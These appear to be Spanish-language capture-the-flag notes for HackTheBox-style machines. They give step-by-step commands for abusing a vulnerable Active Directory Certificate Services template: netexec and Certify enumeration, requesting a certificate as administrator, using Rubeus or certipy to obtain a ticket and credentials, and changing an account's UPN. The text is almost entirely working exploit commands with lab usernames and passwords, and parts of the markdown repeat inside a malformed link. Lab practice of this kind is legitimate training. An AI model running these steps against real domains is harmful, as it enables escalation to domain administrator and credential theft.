[```bash
netexec ldap 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs
```

- Subimos certipy
```powershell
.\Certify.exe find /vulnerable /currentuser
```
- Explotar
```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```

- Ejecutamos lo que nos dice el output para el pfx y luego
```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
```


## Desde Local

```bash
certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
```
- Exploit
```bash
certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication
```
- Autenticarse
```bash
certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.202
```
](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

```bash
netexec ldap 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs
```

- Subimos certipy
```powershell
.\Certify.exe find /vulnerable /currentuser
```
- Explotar
```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```

- Ejecutamos lo que nos dice el output para el pfx y luego
```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
```


## Desde Local


```bash
#NETBIOS NAME
Get-ADDomain –Identity domain.com
#NetBIOS name is contained in the NetBIOSName field
```

```bash
certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
```
- Exploit
```bash
certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication
```
- Autenticarse
```bash
certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.202
```

- SI tengo HASH, debo cambiar el usuario que las pueda manipular:
```bash
 certipy-ad account update \
   -user 'mark.bbond' \
   -upn 'dc01$@mirage.htb' \
   -u 'mirage-service$@mirage.htb' \
   -k -no-pass \
   -dc-ip 10.10.11.78 \
   -target dc01.mirage.htb
```)
